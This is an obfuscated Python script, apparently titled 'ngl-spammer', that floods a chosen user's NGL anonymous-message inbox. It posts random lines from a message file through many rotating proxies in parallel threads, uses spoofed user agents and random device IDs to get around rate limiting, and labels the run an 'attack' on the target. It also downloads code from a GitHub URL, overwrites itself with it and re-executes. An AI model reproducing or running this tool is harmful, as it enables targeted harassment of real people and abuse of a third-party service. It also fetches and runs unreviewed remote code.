Y='utf-8'
X=KeyboardInterrupt
W=input
O='reset'
N=Exception
M=print
E=True
G='critical'
F='success'
D='error'
C='warning'
import random as P,time,threading as H,requests as B,urllib3 as Q,os
from typing import List,Dict,Iterable
import sys
from fake_useragent import UserAgent as Z
Q.disable_warnings(Q.exceptions.InsecureRequestWarning)
a=10
b='https://ngl.link/api/submit'
R=H.Lock()
S=H.Lock()
K=[]
I=[]
J=[]
c=Z()
L={D:'\x1b[38;5;196m',F:'\x1b[38;5;82m',C:'\x1b[38;5;214m',G:'\x1b[38;5;200m',O:'\x1b[0m'}
T='2.0.0'
U='https://raw.githubusercontent.com/borthdayzz/ngl-spammer/refs/heads/main/python/main.py'
def m(msg):
	with R:M(msg,flush=E)
def A(status,msg):
	A=status
	with R:B={D:'×',F:'»',C:'!',G:'†'};H=L.get(A,L[O]);I=B.get(A,'•');M(f"{H}{I} {msg}{L[O]}",flush=E)
def d():A='\n    ╔═══════════════════════════════════════════════════════════════╗\n    ║                          boggle.cc                            ║\n    ║                    Created by: borthdayzz                     ║\n    ╚═══════════════════════════════════════════════════════════════╝\n    ';M(A)
def V(filename):
	B=filename
	try:
		with open(B,'r',encoding=Y)as F:
			E=[A.strip()for A in F if A.strip()]
			if not E:A(C,f"Empty file: {B}")
			return E
	except FileNotFoundError:A(D,f"File not found: {B}");return[]
def e(username):return{'Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Sec-Fetch-Dest':'empty','Sec-Fetch-Mode':'cors','Sec-Fetch-Site':'same-origin','Referer':f"https://ngl.link/{username}",'Origin':'https://ngl.link','User-Agent':c.random}
def f(proxy,username,messages,counter,stop_event):
	J=counter;I=username;E=proxy;L=B.Session();M={'http':f"http://{E}",'https':f"http://{E}"}
	while not stop_event.is_set():
		O=e(I);Q={'username':I,'question':P.choice(messages),'deviceId':''.join(P.choices('0123456789abcdef',k=42)),'gameSlug':'','referrer':''}
		try:
			R=L.post(b,headers=O,data=Q,proxies=M,timeout=(2,5));H=R.status_code
			if H==429:time.sleep(a);continue
			if H!=200:A(D,f"{H} | drop {E}");break
			with S:J[0]+=1;A(F,f"Messages Sent: {J[0]}")
		except B.exceptions.Timeout:A(C,f"Timeout | {E}");break
		except(B.exceptions.ProxyError,B.exceptions.SSLError,B.exceptions.ConnectionError):
			A(D,f"Failed | {E}")
			with S:
				if E not in K:K.append(E)
			break
		except N as T:A(G,f"Error | {E} | {type(T).__name__}");break
def g(username,messages,proxies):
	D=[0];F=H.Event();B=[]
	for C in proxies:
		if C in K:continue
		A=H.Thread(target=f,args=(C,username,messages,D,F),daemon=E);B.append(A);A.start()
	for A in B:A.join()
def h():
	while E:
		try:
			B=W('\x1b[38;5;87m⟫ Target Username: \x1b[0m').strip()
			if not B:A(C,'Username cannot be empty');continue
			return B
		except X:A(G,'\nOperation cancelled');raise
def i():os.system('cls'if os.name=='nt'else'clear')
def j():
	D=False
	try:
		A(F,'Checking for updates...');G=B.get(U,timeout=5)
		if G.status_code==200:
			H=G.text.split('VERSION = "')[1].split('"')[0]
			if H!=T:return E
		return D
	except B.Timeout:A(C,'Update check timed out - skipping');return D
	except B.ConnectionError:A(C,'Could not connect to update server - skipping');return D
	except N as I:A(C,f"Update check failed: {str(I)}");return D
def k():
	try:
		C=B.get(U,timeout=10)
		if C.status_code==200:
			with open(__file__,'w',encoding=Y)as G:G.write(C.text)
			A(F,'Update successful! Restarting...');E=sys.executable;os.execl(E,E,*sys.argv)
	except B.Timeout:A(D,'Update download timed out')
	except B.ConnectionError:A(D,'Could not connect to update server')
	except N as H:A(D,f"Update failed: {str(H)}")
def l():
	i();d()
	if j():
		A(C,f"New version available! Current version: {T}");D=W('\x1b[38;5;87m⟫ Update now? (y/n): \x1b[0m').strip().lower()
		if D=='y':k();return
	A(F,'Loading resources...');global I,J;I=V('messages.txt');J=V('proxy.txt')
	if not I or not J:A(G,'Required files missing or empty');return
	try:B=h();A(F,f"Starting attack on: {B}");g(B,I,J)
	except X:A(G,'\nShutting down...');return
if __name__=='__main__':l()
